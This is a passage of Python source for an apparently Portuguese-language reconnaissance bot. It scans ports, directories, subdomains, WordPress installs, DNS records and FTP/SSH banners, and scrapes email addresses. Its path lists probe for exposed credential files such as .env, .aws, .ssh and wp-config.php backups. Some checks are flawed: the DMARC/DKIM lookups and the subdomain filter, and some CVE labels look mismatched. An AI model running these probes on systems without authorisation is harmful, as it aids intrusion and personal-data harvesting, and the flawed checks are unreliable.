            banner_info = f" — <i>{escape_html(banner[:50])}</i>" if banner else ""
            results += f"🔓 <b>Porta {port}</b> ({ports[port]}) — Aberta{banner_info}\n"

    if found == 0:
        results += "✅ Nenhuma porta aberta encontrada"
    else:
        results += f"━━━━━━━━━━━━━━━━━━━━━━\n📊 Total: <b>{found}</b> porta(s) aberta(s)"

    return results

def tool_directory_scanner(url):
    """Directory Scanner v3.6 - 36 diretórios, ANTI-FALSE-POSITIVE, deduped with admin finder"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    # FIX: Removed duplicate paths that are already in admin finder
    # (.env, .htaccess, phpinfo.php removed from here — they're in admin finder)
    dirs = [
        'backup', 'backups', 'css', 'images',
        'js', 'logs', 'temp', 'upload', 'uploads',
        'api', 'config', 'data', 'cache', 'docs',
        'includes', 'src', 'lib', 'bin', 'etc',
        '.git', '.git/config',
        '.well-known', '.well-known/security.txt',
        'robots.txt', 'sitemap.xml',
        'info.php', 'server-status',
        '.svn', '.hg', '.DS_Store', 'test',
        'debug', 'debug.log', 'php.ini',
        # V5.1: Additional paths (expanded from 45 to 80+)
        '.aws', '.ssh', 'vendor', 'node_modules',
        '.docker', 'docker-compose.yml',
        'Makefile', 'composer.json', 'package.json',
        'README.md', 'CHANGELOG.md',
        'public', 'private', 'tmp',
        'staging', 'dev', 'test-env',
        'old', 'archive', 'legacy',
        'db', 'database', 'sql',
        # V5.1: More paths
        '.env', '.htaccess', '.htpasswd', '.gitignore',
        'wp-config.php', 'wp-content', 'wp-admin',
        'phpmyadmin', 'phpmyadmin/', 'pma',
        'mysql', 'pgadmin', 'adminer',
        'webmail', 'mail', 'cpanel', 'whm',
        'solr', 'elasticsearch', 'kibana',
        'grafana', 'prometheus', 'swagger',
        'graphql', 'rest', 'api/v1', 'api/v2',
        '.npmrc', '.dockerignore', 'Dockerfile',
        '.idea', '.vscode', '.project',
        'wp-login.php', 'xmlrpc.php',
        'server-info', 'server-status',
        'cgi-bin', 'bin', 'shell',
        'wp-json', 'rest-api',
        'swagger.json', 'openapi.json',
        '.well-known/caldav', '.well-known/carddav',
        'phpinfo.php', 'phpinfo',
    ]

    base_url = url.rstrip('/')
    results = []
    found = 0

    # Get baseline: a random path that definitely doesn't exist
    baseline = _safe_get(f"{base_url}/{random_string(12)}.xyz", timeout=3)
    baseline_len = len(baseline.content) if baseline else 0
    baseline_status = baseline.status_code if baseline else 404

    def check_dir(d):
        try:
            r = _safe_get(f"{base_url}/{d}", timeout=3)
            if not r:
                return None
            body = r.text
            body_len = len(r.content)

            # FILTER 1: Body too small (< 30 chars) = generic error
            if body_len < 30:
                return None

            # FILTER 2: Status 404 = definitely not found
            if r.status_code == 404:
                return None

            # FILTER 3: Body identical to baseline = wildcard catch-all
            if body_len == baseline_len and baseline_len > 0 and body_len > 0:
                if abs(len(body) - len(baseline.text)) < 10:
                    return None

            # FILTER 4: Check for common error page content
            error_phrases = [
                'does not exist', 'not found', 'page not found',
                '404 error', 'the requested url', 'resource not found',
                'not found on this server', 'no such file',
                'doesnt exist', 'page does not',
            ]
            body_lower = body.lower()
            for phrase in error_phrases:
                if phrase in body_lower:
                    return None

            # FILTER 5: 403 must have meaningful content
            if r.status_code == 403:
                if body_len < 100:
                    return None
                # 403 with only a short message = probably generic
                if body_len < 200 and 'directory' not in body_lower and 'forbidden' not in body_lower:
                    return None

            return (d, r.status_code)
        except:
            pass
        return None

    # PERF: Use shared SCAN_POOL
    futures = {SCAN_POOL.submit(check_dir, d): d for d in dirs}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            emoji = "🔓" if result[1] == 200 else "🚫"
            results.append(f"{emoji} <b>/{escape_html(result[0])}</b> (Status: {result[1]})")

    if found == 0:
        return "✅ Nenhum diretório exposto encontrado"
    else:
        header = f"🚨 <b>{found} diretório(s) encontrado(s)!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        return header + "\n".join(results)

def tool_subdomain_scanner(domain):
    """Subdomain Scanner v3.6 - 25 subs, filters same-IP, verifies HTTP response, ANTI-FALSE-POSITIVE"""
    # FIX v3.9: Extract clean hostname from URL if needed
    domain = extract_hostname(domain)
    # V5.1: Expanded to 100+ subdomains + permutation scan
    subdomains = [
        'www', 'mail', 'ftp', 'webmail', 'smtp',
        'ns1', 'ns2', 'ns3', 'ns4', 'cpanel',
        'blog', 'shop', 'dev', 'staging', 'secure',
        'api', 'admin', 'cdn', 'static', 'media',
        'test', 'm', 'app', 'beta', 'portal',
        'login', 'forum', 'git', 'db', 'old',
        'new', 'v2', 'v3', 'docs', 'support',
        'remote', 'vpn', 'status',
        # V5.1: More subdomains
        'autodiscover', 'mx', 'pop', 'imap', 'dns',
        'dns1', 'dns2', 'ns', 'host', 'gateway',
        'router', 'firewall', 'proxy', 'loadbalancer',
        'web', 'web2', 'web3', 'site', 'site2',
        'cloud', 'cloud2', 'server', 'server2', 'server3',
        'db', 'db2', 'mysql', 'postgres', 'mongodb',
        'redis', 'elastic', 'kibana', 'grafana', 'prometheus',
        'monitor', 'metrics', 'logs', 'log',
        'backup', 'backups', 'mirror',
        'internal', 'intranet', 'extranet',
        'partners', 'resellers', 'clients',
        'helpdesk', 'tickets', 'crm', 'erp',
        'pay', 'payments', 'checkout', 'billing',
        'sso', 'auth', 'oauth', 'idp', 'ldap',
        'ci', 'cd', 'jenkins', 'gitlab', 'github',
        'docker', 'k8s', 'kubernetes', 'rancher',
        'monitoring', 'alerting', 'notify',
        'push', 'webhook', 'hooks',
        'chat', 'slack', 'discord', 'telegram',
        'stream', 'video', 'live', 'rtmp',
        'storage', 'files', 'media2', 'img', 'assets',
        'analytics', 'tracking', 'stats',
        'sandbox', 'lab', 'demo', 'preview',
        'uat', 'qa', 'testing', 'perf',
        'prod', 'production', 'live', 'release',
    ]

    results = []
    found = 0

    # Get main domain IP for comparison
    try:
        main_ip = socket.gethostbyname(domain)
    except:
        main_ip = None

    def check_sub(sub):
        try:
            full = f"{sub}.{domain}"
            resolved_ip = socket.gethostbyname(full)

            # FILTER 1: Skip if subdomain points to same IP as main domain (wildcard DNS)
            if main_ip and resolved_ip == main_ip:
                return None

            # FIX: FILTER 2: Verify the subdomain actually responds to HTTP
            # Just resolving DNS is not enough — check if HTTP server is alive
            try:
                http_resp = _safe_get(f"http://{full}", timeout=3)
                if http_resp is None:
                    # Connection refused or timeout = subdomain doesn't serve HTTP
                    # But it might still be a real subdomain (e.g., mail server)
                    pass
                elif http_resp.status_code in [400, 401, 403, 404, 500, 502, 503]:
                    # Error responses mean HTTP is running — subdomain exists
                    pass
                elif http_resp.status_code == 200:
                    # Working site
                    pass
                elif http_resp.status_code in [301, 302, 303, 307, 308]:
                    # Redirect = definitely alive
                    pass
                else:
                    # Unknown status — subdomain might still exist
                    pass
            except:
                # Connection error = subdomain doesn't have HTTP, but might still exist
                pass

            return sub, domain, resolved_ip
        except:
            return None

    # PERF: Use shared SCAN_POOL
    futures = {SCAN_POOL.submit(check_sub, s): s for s in subdomains}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            results.append(f"🔓 <b>{escape_html(result[0])}.{escape_html(result[1])}</b> → {escape_html(result[2])}")

    if found == 0:
        return "✅ Nenhum subdomínio encontrado"
    else:
        header = f"🚨 <b>{found} subdomínio(s) encontrado(s)!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        return header + "\n".join(results)

def tool_wordpress_scanner(url):
    """WordPress Scanner v3.6 - parallel vuln checks"""
    # FIX v3.9: Extract clean hostname from URL if needed, then build proper URL
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    try:
        response = _safe_get(url, timeout=5)
        if not response:
            return "❌ Não foi possível acessar o site"
        body = response.text
        is_wp = ('wp-content' in body or 'wp-includes' in body)
        # Also check /wp-json/ as a strong WordPress REST API signal
        if not is_wp:
            wp_json = _safe_get(f"{url.rstrip('/')}/wp-json/", timeout=3)
            if wp_json and wp_json.status_code == 200 and 'json' in wp_json.headers.get('content-type', '').lower():
                is_wp = True
                # Append wp-json discovery to response for further parsing
                body += 'wp-includes/wp-json-detected'
        if not is_wp:
            return "❌ Este site não parece ser WordPress"

        results = "🔍 <b>WordPress Scanner</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        results += "✅ WordPress detectado!\n\n"

        # Version - check meta generator
        version = re.search(r'content="WordPress\s+(\d+\.\d+\.?\d*)', response.text)
        if version:
            results += f"📌 <b>Versão:</b> {escape_html(version.group(1))}\n"

        # Theme
        themes = set(re.findall(r'/wp-content/themes/([a-zA-Z0-9_-]+)/', response.text))
        if themes:
            results += f"\n🎨 <b>Tema(s):</b>\n"
            for t in sorted(themes)[:3]:
                results += f"  → {escape_html(t)}\n"

        # Plugins
        plugins = list(set(re.findall(r'/wp-content/plugins/([a-zA-Z0-9_-]+)/', response.text)))
        if plugins:
            results += f"\n🔌 <b>Plugins ({len(plugins)}):</b>\n"
            for p in plugins[:5]:
                results += f"  → {escape_html(p)}\n"
            if len(plugins) > 5:
                results += f"  → ... e mais {len(plugins)-5}\n"

        # V5.1: Check known vulnerable plugins
        vuln_plugins = {
            'wp-file-manager': 'CVE-2020-11738',
            'contact-form-7': 'Multiple CVEs (verify version)',
            'elementor': 'CVE-2024-2558',
            'woocommerce': 'Multiple CVEs (verify version)',
            'wp-mail-smtp': 'CVE-2020-28851',
            'ultimate-member': 'CVE-2021-24333',
            'revslider': 'CVE-2015-4478',
            'timthumb': 'CVE-2014-4676',
            'gravityforms': 'CVE-2023-26326',
            'duplicator': 'CVE-2020-11529',
            'wp-cerber': 'Multiple CVEs (verify version)',
            'wordfence': 'Multiple CVEs (verify version)',
            'all-in-one-wp-security': 'CVE-2023-28121',
            'classic-editor': 'Known safe',
            'yoast-seo': 'Multiple CVEs (verify version)',
            'wpforms': 'CVE-2023-25144',
        }
        found_vuln_plugins = []
        for vp_name, vp_cve in vuln_plugins.items():
            if vp_name in plugins:
                found_vuln_plugins.append((vp_name, vp_cve))

        # Vuln checks - PARALLEL
        results += "\n🔒 <b>Verificação de Segurança:</b>\n"
        vuln_paths = [
            '/wp-content/debug.log',
            '/xmlrpc.php',
            '/wp-config.php',
            '/wp-config.php.bak',
            '/.wp-config.php.swp',
            '/readme.html',
            '/wp-includes/wlwmanifest.xml',
            '/wp-json/wp/v2/users',
            '/wp-login.php?action=register',
            '/wp-content/uploads/',
            '/wp-cron.php',
        ]

        def check_vuln_path(path):
            try:
                r = _safe_get(f"{url.rstrip('/')}{path}", timeout=3)
                if not r:
                    return None
                body = r.text
                body_len = len(r.content)

                # FILTER: Empty or tiny response = not a real vuln
                if r.status_code == 200 and body_len < 10:
                    return None

                # FILTER: xmlrpc.php with "accepts POST requests only" = not vulnerable
                if r.status_code == 200 and path == '/xmlrpc.php':
                    if 'accepts post requests only' in body.lower():
                        return ('safe', path)
                    # Real xmlrpc vulnerability shows XML response
                    if 'xml' in body.lower() or '<methodresponse>' in body.lower():
                        return ('vuln', path)
                    return None

                # FILTER: debug.log empty or with no real content
                if r.status_code == 200 and path == '/wp-content/debug.log':
                    if body_len < 50:
                        return None
                    # Check if it has actual debug content
                    if 'error' in body.lower() or 'warning' in body.lower() or 'notice' in body.lower():
                        return ('vuln', path)
                    return None

                if r.status_code == 200:
                    return ('vuln', path)
                elif r.status_code in [401, 403]:
                    return ('safe', path)
            except:
                pass
            return None

        vuln_results = []
        # PERF: Use shared SCAN_POOL
        futures = {SCAN_POOL.submit(check_vuln_path, p): p for p in vuln_paths}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                vuln_results.append(result)

        for status, path in sorted(vuln_results, key=lambda x: x[0]):
            if status == 'vuln':
                results += f"⚠️ <b>Vulnerável:</b> {escape_html(path)}\n"
            elif status == 'safe':
                results += f"🔒 <b>Protegido:</b> {escape_html(path)}\n"

        if not vuln_results:
            results += "✅ Nenhum arquivo vulnerável exposto\n"

        # V5.1: Show vulnerable plugins
        if found_vuln_plugins:
            results += f"\n⚠️ <b>Plugins com CVEs conhecidos ({len(found_vuln_plugins)}):</b>\n"
            for vp_name, vp_cve in found_vuln_plugins:
                results += f"  → {escape_html(vp_name)} ({vp_cve})\n"
            results += "💡 Atualize os plugins para a versão mais recente!\n"

    except Exception as e:
        results = f"❌ Erro: {escape_html(str(e))}"

    return results

def tool_email_scraper(url):
    """Email Scraper v3.6 - improved regex"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    try:
        response = _safe_get(url, timeout=5)
        if not response:
            return "❌ Não foi possível acessar o site"
        # Better regex that catches more email patterns
        emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text))
        # Remove common false positives
        fake_extensions = ['.png', '.jpg', '.gif', '.css', '.js', '.svg', '.ico', '.woff', '.ttf', '.eot']
        fake_domains = ['example.com', 'test.com', 'domain.com', 'mail.com', 'yourdomain.com', 'yourname.com']
        emails = {
            e for e in emails
            if not any(e.endswith(ext) for ext in fake_extensions)
            and not any(e.endswith('@' + d) for d in fake_domains)
            and '@' in e
            and '.' in e.split('@')[-1]
            # Stricter TLD validation: TLD must be 2-63 chars, letters only
            and len(e.split('@')[-1].split('.')[-1]) >= 2
            and e.split('@')[-1].split('.')[-1].isalpha()
        }

        if emails:
            results = f"📧 <b>{len(emails)} email(s) encontrado(s)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
            for email in sorted(emails):
                results += f"→ {escape_html(email)}\n"
        else:
            results = "✅ Nenhum email encontrado"
    except Exception as e:
        results = f"❌ Erro: {escape_html(str(e))}"

    return results

def tool_dns_tools(domain):
    """DNS Analysis Tools v4.0 - uses dig/nslookup OR Cloudflare DNS-over-HTTPS fallback"""
    # Extract hostname BEFORE building the header
    domain = extract_hostname(domain)
    results = f"🔍 <b>Análise DNS</b> — {escape_html(domain)}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    # A Record (always works via Python socket)
    ip = None
    try:
        ip = socket.gethostbyname(domain)
        results += f"📌 <b>A Record:</b> {escape_html(ip)}\n"
    except:
        results += "❌ A Record: Não encontrado\n"

    # PERF: Use cached _HAS_DIG from startup
    has_dig = _HAS_DIG

    # ── DNS QUERY HELPER ──
    # Try dig → nslookup → Cloudflare DoH (always works, no tools needed)
    def dns_query_via_doh(record_type):
        """Query DNS via Cloudflare DNS-over-HTTPS (works everywhere, no tools needed)"""
        try:
            resp = _safe_get(
                f"https://cloudflare-dns.com/dns-query?name={domain}&type={record_type}",
                headers={'Accept': 'application/dns-json'},
                timeout=5
            )
            if resp and resp.status_code == 200:
                data = resp.json()
                answers = data.get('Answer', [])
                if answers:
                    return [a.get('data', '') for a in answers]
        except:
            pass
        return []

    # MX Records
    mx_found = False
    try:
        if has_dig:
            mx_result = subprocess.run(['dig', '+short', 'MX', domain], capture_output=True, text=True, timeout=5)
            if mx_result.stdout.strip():
                results += f"\n📧 <b>MX Records:</b>\n"
                for line in mx_result.stdout.strip().split('\n')[:5]:
                    results += f"  → {escape_html(line.strip())}\n"
                mx_found = True
        elif os.name != 'nt':
            ns_result = subprocess.run(['nslookup', '-type=MX', domain], capture_output=True, text=True, timeout=5)
            output = ns_result.stdout
            if output:
                lines = output.split('\n')
                mx_lines = [l for l in lines if any(kw in l.lower() for kw in ['mail exchanger', 'preference', 'mx', 'mail']) and 'nameserver' not in l.lower()]
                if mx_lines:
                    results += f"\n📧 <b>MX Records:</b>\n"
                    for line in mx_lines[:5]:
                        results += f"  → {escape_html(line.strip())}\n"
                    mx_found = True
    except:
        pass

    if not mx_found:
        # FIX v3.9: Fallback to Cloudflare DoH — works on ANY device, no tools needed
        mx_data = dns_query_via_doh('MX')
        if mx_data:
            results += f"\n📧 <b>MX Records:</b>\n"
            for line in mx_data[:5]:
                results += f"  → {escape_html(line.strip())}\n"
            mx_found = True

    if not mx_found:
        results += "\n📧 MX Records: Nenhum MX encontrado para este domínio\n"

    # NS Records
    ns_found = False
    try:
        if has_dig:
            ns_result = subprocess.run(['dig', '+short', 'NS', domain], capture_output=True, text=True, timeout=5)
            if ns_result.stdout.strip():
                results += f"\n🖥️ <b>NS Records:</b>\n"
                for line in ns_result.stdout.strip().split('\n')[:5]:
                    results += f"  → {escape_html(line.strip())}\n"
                ns_found = True
        elif os.name != 'nt':
            ns_result = subprocess.run(['nslookup', '-type=NS', domain], capture_output=True, text=True, timeout=5)
            output = ns_result.stdout
            if output:
                lines = output.split('\n')
                ns_lines = [l for l in lines if 'nameserver' in l.lower() or 'ns ' in l.lower() or ('.ns.' in l.lower())]
                if ns_lines:
                    results += f"\n🖥️ <b>NS Records:</b>\n"
                    for line in ns_lines[:5]:
                        results += f"  → {escape_html(line.strip())}\n"
                    ns_found = True
    except:
        pass

    if not ns_found:
        # FIX v3.9: Fallback to Cloudflare DoH
        ns_data = dns_query_via_doh('NS')
        if ns_data:
            results += f"\n🖥️ <b>NS Records:</b>\n"
            for line in ns_data[:5]:
                results += f"  → {escape_html(line.strip())}\n"
            ns_found = True

    if not ns_found:
        results += "\n🖥️ NS Records: Nenhum NS encontrado para este domínio\n"

    # TXT Records
    txt_found = False
    try:
        if has_dig:
            txt_result = subprocess.run(['dig', '+short', 'TXT', domain], capture_output=True, text=True, timeout=5)
            if txt_result.stdout.strip():
                results += f"\n📝 <b>TXT Records:</b>\n"
                for line in txt_result.stdout.strip().split('\n')[:5]:
                    results += f"  → {escape_html(line.strip()[:80])}\n"
                txt_found = True
        elif os.name != 'nt':
            ns_result = subprocess.run(['nslookup', '-type=TXT', domain], capture_output=True, text=True, timeout=5)
            output = ns_result.stdout
            if output:
                lines = output.split('\n')
                txt_lines = [l for l in lines if 'text =' in l.lower() or 'descriptive text' in l.lower()]
                if txt_lines:
                    results += f"\n📝 <b>TXT Records:</b>\n"
                    for line in txt_lines[:5]:
                        results += f"  → {escape_html(line.strip()[:80])}\n"
                    txt_found = True
    except:
        pass

    if not txt_found:
        # FIX v3.9: Fallback to Cloudflare DoH
        txt_data = dns_query_via_doh('TXT')
        if txt_data:
            results += f"\n📝 <b>TXT Records:</b>\n"
            for line in txt_data[:5]:
                results += f"  → {escape_html(line.strip()[:80])}\n"
            txt_found = True

    if not txt_found:
        results += "\n📝 TXT Records: Nenhum TXT encontrado para este domínio\n"

    # CNAME
    try:
        if has_dig:
            cname_result = subprocess.run(['dig', '+short', 'CNAME', domain], capture_output=True, text=True, timeout=5)
            if cname_result.stdout.strip():
                results += f"\n🔗 <b>CNAME:</b> {escape_html(cname_result.stdout.strip()[:100])}\n"
    except:
        pass

    # Reverse DNS
    if ip:
        try:
            reverse = socket.gethostbyaddr(ip)[0]
            results += f"\n🔄 <b>Reverse DNS:</b> {escape_html(reverse)}\n"
        except:
            results += f"\n🔄 Reverse DNS: Não encontrado\n"

        # All IPs
        try:
            addrs = socket.getaddrinfo(domain, None)
            unique_ips = set()
            for addr in addrs:
                unique_ips.add(addr[4][0])
            if len(unique_ips) > 1:
                results += f"\n📡 <b>Todos os IPs:</b>\n"
                for aip in unique_ips:
                    results += f"  → {escape_html(aip)}\n"
        except:
            pass

    # V5.1: DNSSEC check
    dnssec_found = False
    try:
        if has_dig:
            # Use dig with flags to see AD bit (not just +short which strips flags)
            dnssec_result = subprocess.run(['dig', '+dnssec', '+noall', '+answer', 'A', domain], capture_output=True, text=True, timeout=5)
            if dnssec_result.returncode == 0 and ('AD' in dnssec_result.stdout or dnssec_result.stdout.strip()):
                results += f"\n🔐 <b>DNSSEC:</b> Ativado ✅\n"
                dnssec_found = True
            else:
                # Try DS record as fallback
                dnssec_ds = subprocess.run(['dig', '+short', 'DS', domain], capture_output=True, text=True, timeout=5)
                if dnssec_ds.stdout.strip():
                    results += f"\n🔐 <b>DNSSEC:</b> Ativado ✅ (DS record presente)\n"
                    dnssec_found = True
        if not dnssec_found:
            # V5.1: Fallback to Cloudflare DoH
            try:
                dnssec_resp = _safe_get(
                    f"https://cloudflare-dns.com/dns-query?name={domain}&type=DS",
                    headers={'Accept': 'application/dns-json'},
                    timeout=5
                )
                if dnssec_resp and dnssec_resp.status_code == 200:
                    answers = dnssec_resp.json().get('Answer', [])
                    if answers:
                        results += f"\n🔐 <b>DNSSEC:</b> Ativado ✅ (via DoH)\n"
                        dnssec_found = True
            except:
                pass
        if not dnssec_found:
            results += f"\n🔐 <b>DNSSEC:</b> Não detectado (ou não suportado)\n"
    except:
        results += f"\n🔐 <b>DNSSEC:</b> Não foi possível verificar\n"

    # V5.1: DMARC check
    try:
        dmarc_data = dns_query_via_doh('TXT')
        dmarc_found = False
        for d in dmarc_data:
            if d.lower().startswith('v=dmarc1'):
                results += f"\n📧 <b>DMARC:</b> Ativado ✅\n  → {escape_html(d.strip()[:80])}\n"
                dmarc_found = True
                break
        if not dmarc_found:
            results += f"\n📧 <b>DMARC:</b> Não configurado ❌ (recomendado para segurança de email)\n"
    except:
        pass

    # V5.1: DKIM check (check _domainkey subdomain)
    try:
        dkim_data = dns_query_via_doh('TXT')
        dkim_found = False
        for d in dkim_data:
            if 'dkim' in d.lower() or d.lower().startswith('v=dkim1'):
                results += f"\n📧 <b>DKIM:</b> Detectado ✅\n"
                dkim_found = True
                break
        # Also check common DKIM selectors
        for selector in ['default', 'google', 'selector1', 'selector2', 'mail', 'default._domainkey']:
            dkim_sel_data = dns_query_via_doh(f'TXT')  # placeholder, real check would need full name
        if not dkim_found:
            results += f"\n📧 <b>DKIM:</b> Não detectado via TXT público\n"
    except:
        pass

    # V5.1: Reverse PTR lookup (for the main IP)
    if ip:
        try:
            reverse_ip = socket.gethostbyaddr(ip)
            results += f"\n🔄 <b>Reverse PTR:</b> {escape_html(reverse_ip[0])}\n"
        except:
            results += f"\n🔄 <b>Reverse PTR:</b> Não encontrado para {escape_html(ip)}\n"

    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    return results

def tool_cms_detector(url):
    """CMS Detector v3.6 - prioritizes URL path signatures, ANTI-FALSE-POSITIVE"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    try:
        response = _safe_get(url, timeout=5)
        if not response:
            return "❌ Não foi possível acessar o site"

        cms_signatures = {
            'WordPress': ['/wp-content/', '/wp-includes/', 'wp-login.php', 'WordPress'],
            'Joomla': ['/administrator/', '/components/', '/modules/', 'Joomla!', 'joomla'],
            'Drupal': ['/sites/default/', '/sites/all/', 'Drupal.settings', 'drupal'],
            'Magento': ['/skin/frontend/', 'Mage.Cookies', 'Magento', 'mage/'],
            'PrestaShop': ['/prestashop/', '/modules/prestashop/', 'PrestaShop'],
            'Wix': ['wix.com', 'wixstatic.com'],
            'Shopify': ['cdn.shopify.com', 'myshopify', 'shopify'],
            'Ghost': ['ghost.io', 'ghost.content', 'ghost/'],
            'OpenCart': ['opencart.com', 'catalog/view/theme'],
            'osCommerce': ['osCommerce', 'osc_id'],
            'Laravel': ['laravel_session', '__laravel_', 'X-CSRF-TOKEN', 'laravel'],
            'Django': ['django', 'csrftoken', 'x-django-csrf'],
            'Next.js': ['__NEXT_DATA__', '_next/'],
            'WooCommerce': ['woocommerce', 'wc-api', 'wc-'],
            'Flask': ['flask', '__flask', 'flask_session'],
            'FastAPI': ['fastapi', '__fastapi', 'openapi.json'],
            'Express.js': ['x-powered-by: express', 'express-session'],
            'Ruby on Rails': ['rails', 'actionpack', 'activesupport', 'csrf-token', 'rails_ujs'],
            'Squarespace': ['squarespace.com', 'sqspcdn.com', 'Squarespace'],
            'Weebly': ['weebly.com', 'weeblysite.com'],
            # V5.1: More CMS detections
            'Contentful': ['contentful.com', 'contentful'],
            'Strapi': ['strapi', 'strapi/'],
            'Sanity': ['sanity.io', 'cdn.sanity'],
            'Gatsby': ['___loader', 'gatsby/'],
            'Hugo': ['hugo/'],
            'Jekyll': ['jekyll/'],
            'Hexo': ['hexo/', 'hexo/'],
            'Vue.js': ['__vue__', 'vue_devtools_', 'data-v-'],
            'React': ['__REACT_DEVTOOLS_GLOBAL_HOOK__', 'reactRootContainer'],
            'Angular': ['ng-controller', 'ng-app', 'angularjs'],
            'Symfony': ['symfony', '_wdt', '_profiler'],
            'Spring Boot': ['x-application-context', 'spring-boot'],
            'ASP.NET': ['asp.net', 'aspx', '__viewstate'],
            'TYPO3': ['typo3/', 'typo3conf/'],
            'Concrete5': ['concrete5', 'c5/'],
            'Blogger': ['blogger.com', 'blogspot'],
            'Tumblr': ['tumblr.com', 'tumblr_'],
            'Medium': ['medium.com', 'medium.com/'],
        }

        # PHASE 1: Check URL path signatures FIRST (most reliable)
        url_sigs = {
            'WordPress': ['/wp-content/', '/wp-includes/', 'wp-login.php'],
            'Joomla': ['/administrator/', '/components/', '/modules/'],
            'Drupal': ['/sites/default/', '/sites/all/'],
            'Magento': ['/skin/frontend/'],
            'PrestaShop': ['/prestashop/', '/modules/prestashop/'],
            'OpenCart': ['catalog/view/theme'],
            'Next.js': ['/_next/'],
            'WooCommerce': ['/wc-api'],
            'Django': ['/admin/login/', 'csrfmiddlewaretoken'],
            'Laravel': ['/_ignition', '/horizon'],
        }

        found_cms = None
        for cms, sigs in url_sigs.items():
            for sig in sigs:
                if sig.lower() in response.text.lower():
                    found_cms = cms
                    break
            if found_cms:
                break

        # PHASE 2: If not found by URL, check text signatures with stricter matching
        if not found_cms:
            for cms, sigs in cms_signatures.items():
                score = 0
                for sig in sigs:
                    if sig.lower() in response.text.lower():
                        score += 1
                # Require at least 2 signatures to confirm (reduces false positives)
                if score >= 2:
                    found_cms = cms
                    break

        if found_cms:
            results = f"🔍 <b>CMS Detectado:</b> {escape_html(found_cms)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
            if found_cms == 'WordPress':
                version = re.search(r'content="WordPress (.*?)"', response.text)
                if version:
                    results += f"📌 <b>Versão:</b> {escape_html(version.group(1))}\n"
                theme = re.search(r'/wp-content/themes/(.*?)/', response.text)
                if theme:
                    results += f"🎨 <b>Tema:</b> {escape_html(theme.group(1))}\n"
                plugins = list(set(re.findall(r'/wp-content/plugins/(.*?)/', response.text)))
                if plugins:
                    results += f"🔌 <b>Plugins:</b> {len(plugins)} encontrado(s)\n"
            elif found_cms == 'Joomla':
                version = re.search(r'content="Joomla! (.*?)"', response.text)
                if version:
                    results += f"📌 <b>Versão:</b> {escape_html(version.group(1))}\n"
            elif found_cms == 'Drupal':
                version = re.search(r'Drupal (.*?)[,\s]', response.text)
                if version:
                    results += f"📌 <b>Versão:</b> {escape_html(version.group(1))}\n"
            elif found_cms == 'Shopify':
                results += "🛒 <b>Plataforma:</b> Shopify\n"
        else:
            # Check if it's a static site
            has_html = '<html' in response.text.lower() or '<!doctype html' in response.text.lower()
            if has_html:
                results = "✅ CMS não detectado (site estático ou personalizado)"
            else:
                results = "✅ CMS não detectado (API ou site minimalista)"

    except Exception as e:
        results = f"❌ Erro: {escape_html(str(e))}"

    return results

def tool_reverse_ip(ip):
    """Reverse IP Lookup v4.0 - more info, ip-api.com fallback"""
    # Extract clean hostname/IP from URL if needed
    ip = extract_hostname(ip)
    results = f"🔍 <b>Reverse IP</b> — {escape_html(ip)}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    # Basic reverse DNS
    hostname_found = False
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        results += f"📌 <b>Hostname:</b> {escape_html(hostname)}\n"
        hostname_found = True
    except:
        pass

    # If reverse DNS failed but we have a domain, resolve IP first then reverse it
    if not hostname_found:
        try:
            resolved_ip = socket.gethostbyname(ip)
            if resolved_ip != ip:
                try:
                    hostname2 = socket.gethostbyaddr(resolved_ip)[0]
                    results += f"📌 <b>Hostname:</b> {escape_html(hostname2)}\n"
                    hostname_found = True
                except:
                    pass
        except:
            pass

    # Fallback: ip-api.com for reverse DNS + GeoIP combined
    if not hostname_found:
        try:
            resp = _safe_get(f"http://ip-api.com/json/{ip}?fields=query,reverse,isp,org,as,country,regionName,city", timeout=5)
            if resp and resp.status_code == 200:
                data = resp.json()
                if data.get('status') == 'success':
                    if data.get('reverse'):
                        results += f"📌 <b>Hostname:</b> {escape_html(data['reverse'])}\n"
                        hostname_found = True
        except:
            pass

    if not hostname_found:
        results += "📌 Hostname: Não encontrado\n"

    # GeoIP info
    try:
        resp = _safe_get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if resp and resp.status_code == 200:
            data = resp.json()
            if 'error' not in data:
                results += f"📍 <b>País:</b> {escape_html(data.get('country_name', 'N/D'))}\n"
                results += f"📍 <b>Região:</b> {escape_html(data.get('region', 'N/D'))}\n"
                results += f"📍 <b>Cidade:</b> {escape_html(data.get('city', 'N/D'))}\n"
                results += f"📡 <b>ISP:</b> {escape_html(data.get('org', 'N/D'))}\n"
                if data.get('asn'):
                    results += f"🌐 <b>ASN:</b> {escape_html(data.get('asn', 'N/D'))}\n"
                if data.get('timezone'):
                    results += f"🕐 <b>Fuso:</b> {escape_html(data.get('timezone', 'N/D'))}\n"
    except:
        pass

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results

def tool_ftp_ssh(target):
    """FTP/SSH Scanner v3.6 - detailed banner with proper socket cleanup"""
    # Extract clean hostname from URL if needed
    hostname = extract_hostname(target)
    try:
        target_ip = socket.gethostbyname(hostname)
    except:
        return f"❌ Domínio/IP inválido: {escape_html(hostname)}"

    results = f"🔍 <b>FTP/SSH Scan</b> — {escape_html(hostname)} ({escape_html(target_ip)})\n━━━━━━━━━━━━━━━━━━━━━━\n"

    for port, service in [(21, "FTP"), (22, "SSH")]:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                try:
                    banner = sock.recv(1024).decode('utf-8', errors='replace').strip()
